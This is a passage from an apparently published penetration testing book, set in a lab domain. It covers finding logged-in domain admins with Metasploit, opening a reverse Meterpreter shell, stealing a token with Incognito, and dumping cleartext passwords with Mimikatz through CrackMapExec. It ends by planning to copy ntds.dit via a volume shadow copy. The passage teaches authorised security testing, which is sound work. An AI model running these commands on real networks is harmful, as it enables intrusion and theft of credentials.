This domain has three users
with domain admin privileges.
179
Identifying domain admin user accounts
 Now that you know who the domain admin users are, the next step is to locate a
system or systems where one or more of them are actively logged in. My preferred
method of doing this is to use the psexec_command Metasploit module to run the
qwinsta command on every Windows system I have access to. The qwinsta command
outputs information about currently active user sessions, which is all you need to iden-
tify whether a domain admin is logged in. If you’ve never heard of qwinsta, you can
check out the Microsoft documentation at http://mng.bz/lXY6. That said, if you
keep reading, you’ll soon understand what the command does.
10.1.2 Locating logged-in domain admin users
It may not be apparent if you are working off of the Capsulecorp Pentest lab environ-
ment, but searching for domain admin accounts on a huge enterprise network can be
painful. In some cases, it’s similar to the old needle-in-a-haystack analogy. 
 Imagine a giant company with 10,000+ computer systems. It takes security seriously
and therefore has only four domain admin accounts throughout the entire domain,
which has 20,000+ user accounts. You’ve obtained half a dozen local administrator
account password hashes from various level-one systems, which give you local admin
access to a couple of hundred servers and workstations you’ve identified using Pass-
the-Hash. Now you need to go into each one of them and see whether a domain
admin is logged in. 
 I hope you can appreciate what a tedious task this would be. Because the psexec_
command module uses Metasploit’s threading capabilities and can jump into multiple
systems at a time, you can accomplish this feat in just a few minutes, as opposed to
spending several hours doing it by hand. Load the psexec_command module from an
msfconsole, and enter the necessary parameters:
Use auxiliary/admin/smb/psexec_command
set rhosts file:/path/to/windows.txt
set smbdomain .
set smbuser Administrator
set smbpass [LMHASH:NTLMHASH]
set threads 10
set command qwinsta
set verbose false
run
Running the module displays the output of the qwinsta command on all of your
accessible level-one and level-two systems. See listing 10.2 for an example.
TIP
If you are running this command against hundreds of systems, it is not
practical to assume you can watch the output and pick out a domain admin
user. Instead, you should create a spool file from the msfconsole using the
command spool /path/to/filename. This creates a running log of all your
MSF activity that you can search through later using grep.
180
CHAPTER 10
Controlling the entire network
[+] 10.0.10.208:445       - Cleanup was successful
[+] 10.0.10.208:445       - Command completed successfully!
[*] 10.0.10.208:445       - Output for "qwinsta":
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc                        
 console                                     1  Conn                        
 rdp-tcp#0         tien                      2  Active  rdpwd    
 rdp-tcp                                 65536  Listen                      
[+] 10.0.10.207:445       - Cleanup was successful
[+] 10.0.10.207:445       - Command completed successfully!
[*] 10.0.10.207:445       - Output for "qwinsta":
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc                        
 console                                     1  Conn                        
 rdp-tcp#2         serveradmin               2  Active    
 rdp-tcp                                 65536  Listen                      
You will recall from listing 10.1 that the serveradmin user account is a member of the
domain admins group. Now you know that the computer at 10.0.10.207 has a domain
admin user logged in via Remote Desktop (RDP). The next step is to access this sys-
tem using the local administrator credentials you already have. Then, use the domain
admin user’s active session to elevate your privileges to domain admin. In this case, I
prefer to access the machine directly using a Meterpreter payload, which you are
already familiar with. However, you could do so with any means of remote access that
grants you command-line capabilities on the target machine.
10.2
Obtaining domain admin privileges 
When you already have credentials for a Windows system, and you need to open a
direct access Meterpreter session, I recommend using the psexec_psh module. Do
not be confused by the fact that this module is located in the exploit tree. It is not
exploiting or attacking any vulnerabilities on the target. It is simply using the native
PowerShell functionality in Windows and the administrator credentials you provide to
launch a PowerShell payload that connects back to your Metasploit listener and opens
a new Meterpreter shell. 
 The following commands launch the module from the msfconsole and gain a
Meterpreter shell on the 10.0.10.207 system identified in listing 10.2 as having a
domain admin user logged in:
use exploit/windows/smb/psexec_psh
set rhosts 10.0.10.207
set smbdomain .
set smbuser Administrator
Listing 10.2
Identifying systems with a logged-in domain admin
An ordinary 
user session
Bingo! A domain admin is 
logged in to this system 
via RDP.
181
Obtaining domain admin privileges
set smbpass [LMHASH:NTLMHASH]
set payload windows/x64/meterpreter/reverse_winhttps
exploit
After launching this module with the exploit command, you see the now-familiar
message stating that a new Meterpreter session has opened.
msf5 exploit(windows/smb/psexec_psh) > exploit
[*] Started HTTPS reverse handler on https://10.0.10.160:8443
[*] 10.0.10.207:445 - Executing the payload...
[+] 10.0.10.207:445 - Service start timed out, OK if running a command or
non-service executable...
[*] https://10.0.10.160:8443 handling request from 10.0.10.207; (UUID:
3y4op907) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 6 opened (10.0.10.160:8443 -> 10.0.10.207:22633) at
2020-02-28 14:03:45 -0600
meterpreter >
Now that you have direct access to the target machine, we’ll discuss two methods for
obtaining domain admin privileges on the Capsulecorp Pentest domain using the
existing user session on this host. The first method uses a Meterpreter extension
called Incognito to steal the user’s token, which works on Windows similarly to how a
cookie works in your internet browser. If you present Windows with a valid token, you
are the user associated with that token. There are more details involved in the techni-
cal mechanics of the process, but we don’t need to go into them right now. All you
need to understand is that when a user is logged in to a Windows machine, a token is
assigned to them and passed around to various components of the OS each time the
user invokes an action that requires validation of their access rights. 
 If you have administrator access to a Windows machine, you can obtain the tokens
of another logged-in user and therefore masquerade as that user on the machine. In
this case, it’s because the user whose token you plan to steal is also joined to an Active
Directory domain and consequently is part of the Domain Admins group. You will also
obtain those privileges as long as you possess the token and the token remains active.
If you want a more technical explanation of this attack vector, read this excellent blog
post from the original Incognito authors: https://labs.f-secure.com/archive/
incognito-v2-0-released/.
NOTE
Be sure to add this meterpreter session to your engagement notes. It is
a direct compromise and a shell connection that you will need to destroy
properly during post-engagement cleanup. 
Listing 10.3
Opening a new Meterpreter session on 10.0.10.207
182
CHAPTER 10
Controlling the entire network
10.2.1 Impersonating logged-in users with Incognito
Due to the widespread popularity of Incognito, it was incorporated into the Meter-
preter payload as an extension you can load by typing the command load incognito.
Once it’s loaded, you have access to a couple of commands that will look familiar to
anyone who has used the standalone Incognito binary. To get a list of available tokens,
run the list_tokens -u command. The output of the command (listing 10.4) shows
that a token is available for the capsulecorp\serveradmin user account that we iden-
tified previously. The following commands load the Incognito extension into your
Meterpreter session and list the available tokens:
load incognito
list_tokens -u
Delegation Tokens Available
========================================
CAPSULECORP\serveradmin    
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1
Window Manager\DWM-2
Taking advantage of this user’s token is as easy as typing impersonate_token
capsulecorp\\serveradmin at the Meterpreter prompt. If it isn’t apparent, the
reason for the double backslash (\\) is that you are in the Ruby program language, so
you need to escape the \ character in strings. Listing 10.5 shows what it looks like
when you impersonate a user. You can tell from the status message that the
impersonation was successful. If you now execute a command prompt by running the
shell command and then issuing the whoami Windows command, you can see that
you are impersonating the capsulecorp\serveradmin user account on this machine.
[+] Delegation token available
[+] Successfully impersonated user CAPSULECORP\serveradmin
meterpreter > shell.    
Process 4648 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami.
whoami
capsulecorp\serveradmin
C:\Windows\system32>  
Listing 10.4
Listing available tokens with Incognito
Listing 10.5
Impersonating the domain admin account
The token you want 
to impersonate
Successfully 
impersonated 
the capsulecorp\
serveradmin user
Opens a command shell 
on the remote host
Runs the whoami command to show 
that you are capsulecorp\serveradmin
183
Obtaining domain admin privileges
The second method for obtaining domain admin privileges is to extract the clear-text
credentials for this user using Mimikatz (as you did in chapter 8). I prefer this method
over impersonating with tokens because tokens expire sooner than the user’s creden-
tials. Also, with a valid set of credentials, you can masquerade as a domain admin user
on any system you want, as opposed to being limited to the single system that issued
the token.
10.2.2 Harvesting clear-text credentials with Mimikatz
As you did in chapter 8, you can use CrackMapExec (CME) to run Mimikatz on the
10.0.10.207 host and extract the capsulecorp\serveradmin user’s clear-text creden-
tials from the server’s memory. This username and password will get you into any
Active Directory–joined computer on the entire network. The following is the com-
mand syntax for using Mimikatz with CME:
cme smb 10.0.10.207 --local-auth -u administrator -H [hash] -M mimikatz
Running the cme command results in the output shown in the next listing. You can see
the clear-text credentials for the serveradmin user account. Also, cme generates a
handy log file, which stores this information for later retrieval.
[*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:RADITZ)
(domain:RADITZ) (signing:True) (SMBv1:True)
[+] RADITZ\administrator c1ea09ab1bab83a9c9c1f1c366576737 (Pwn3d!)
[+] Executed launcher
[*] Waiting on 1 host(s)
[*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
[*] - - "POST / HTTP/1.1" 200 -
CAPSULECORP\serveradmin:7d51bc56dbc048264f9669e5a47e0921
CAPSULECORP\RADITZ$:f215b8055f7e0219b184b5400649ea0c
CAPSULECORP\serveradmin:S3cr3tPa$$!    
[+] Added 3 credential(s) to the database
[*] Saved raw Mimikatz output to Mimikatz-10.0.10.207-2020-03
03_152040.log. 
Great! Now you have a valid set of domain admin credentials that you can use to log in
to any system on the target network and do anything you want. You might be thinking
that the pentest could end here. I prefer to take things one step further, though, and I
think you’ll agree after considering the following.
 Suppose you were a true bad actor who had just carried out this network-level
attack and obtained this set of valid domain admin credentials. You aren’t a security
consultant hired to improve the company’s security, so your motivations for attacking
this organization have to be something else. Maybe you want to steal money, cause
harm, or steal intellectual property or trade secrets. Regardless of the reason, getting
Listing 10.6
Harvesting the clear-text password using Mimikatz
Clear-text password for the 
capsulecorp\serveradmin 
account
If you forget, the credentials 
are stored in this log file.
184
CHAPTER 10
Controlling the entire network
caught is probably a worst-case scenario for you. With that in mind, are you going to
log in to the payroll system with your domain admin credentials and start issuing fake
checks? If you do, the account you just compromised will immediately become
exposed and will soon be deactivated; you’ll be out of luck and defeat the first goal of
post-exploitation—maintaining reliable re-entry into your target environment.
 If I were a real bad guy, I would be interested in obtaining as many sets of valid cre-
dentials as possible. That way, I could log in and out of systems using different sets of
employee credentials in an attempt to cover my tracks or at least make it more diffi-
cult to detect that I was ever there. This would ensure that I could come and go for as
long as possible. The most effective way to accomplish that is to extract all the pass-
word hashes for all of the Active Directory users by exporting the ntds.dit database
directly from the domain controller. So that’s exactly what we’re going to do next.
10.3
ntds.dit and the keys to the kingdom
The password hashes for all Active Directory user accounts are stored on the domain
controller in an extensible storage engine database (ESEDB) called ntds.dit. This
database exists as a flat binary file at the c:\windows\ntds\ntds.dit file path.
 As you would expect, this is a carefully protected file; even with administrator
access, you can’t modify it or pull password information from it directly. But much as
with registry hive files, you can make a copy of ntds.dit and download it from the
domain controller. Then, using other tools, you can extract the Active Directory pass-
word hashes to your heart’s content. But to do this, you need to locate the domain
controller for your target domain. The simplest method is to use the ping command
from a machine joined to the domain to resolve the top-level domain. In this case,
running ping capsulecorp.local will reveal the IP address of the domain controller.
Here is how to use CME to issue that command from the 10.0.10.207 host we’ve been
using in this chapter:
cme smb 10.0.10.207 --local-auth -u administrator -H [hash] -x "cmd /c ping
capsulecorp.local"
The following listing shows that the domain controller for this network is located at
10.0.10.200. This system will have the ntds.dit file you need in order to obtain all the
password hashes for all the Active Directory user accounts.
[*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:RADITZ)
(domain:RADITZ) (signing:True) (SMBv1:True)
[+] RADITZ\administrator c1ea09ab1bab83a9c9c1f1c366576737 (Pwn3d!)
[+] Executed command 
Pinging capsulecorp.local [10.0.10.200] with 32 bytes of data:
Reply from 10.0.10.200: bytes=32 time<1ms TTL=128    
Reply from 10.0.10.200: bytes=32 time<1ms TTL=128
Listing 10.7
Locating the domain controller’s IP address
You get a reply from 
10.0.10.200. This is your 
target domain controller.
185
ntds.dit and the keys to the kingdom
The domain admin credentials you obtained have access to log in to this machine. But
as mentioned, you cannot simply navigate to the c:\windows\ntds directory and make a
copy of the ntds.dit file. If you try that, you’ll be greeted with an “access denied” error
message from the OS.
 So how do you get a copy of the ESEDB file? With Microsoft’s Volume Shadow
Copies (VSC). VSC was added to Windows in the days of Windows XP. It was intended
to serve as a snapshot that you could use to revert your filesystem back to a given state
at a particular point in time when a VSC was made. It turns out that these copies, if
present, are just static data mounts. That is, the OS isn’t monitoring them for access
restrictions. A VSC behaves much like a USB flash drive. If I have access to read the
flash drive, I can access any of the files in it. You can check the domain controller for
an existing VSC or create one if one doesn’t exist using the vssadmin command—
provided, of course, you have administrator privileges on the server. Take a look at
figure 10.2 for a graphical illustration.
Now that you’ve located the domain controller and understand a little about VSCs, the
next thing to do is check whether it has any existing VSCs you can use to obtain a copy
of ntds.dit. If an existing VSC is not present, you can create one using the vssadmin
command.
10.3.1 Bypassing restrictions with VSC
First, let’s check to see whether this domain controller already has a VSC. It’s quite
common for IT systems administrators to regularly create VSCs to use as Microsoft
intended: as point-in-time snapshots that they can restore to if something goes wrong.
B
C
D
All the password
hashes
All the password
hashes
Penetration tester
Domain controller
$ vssadmin create shadow /for=C:
\\?\..\windows\ntds\ntds.dit
lmpacket: secretsdump.py
\\?\..\windows\system32\config\system
Volume shadow
copy
Impersonate a domain admin user
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
A. Impersonate a domain admin user, and access the domain controller.
B. Create a new volume shadow copy with the vssadmin command.
C. Steal a copy of NTDS.dit and SYSTEM from the VSC.
D. Use secretsdump.py from lmpacket to extract the password hashes
    for all Active Directory users.
All the password
hashes
A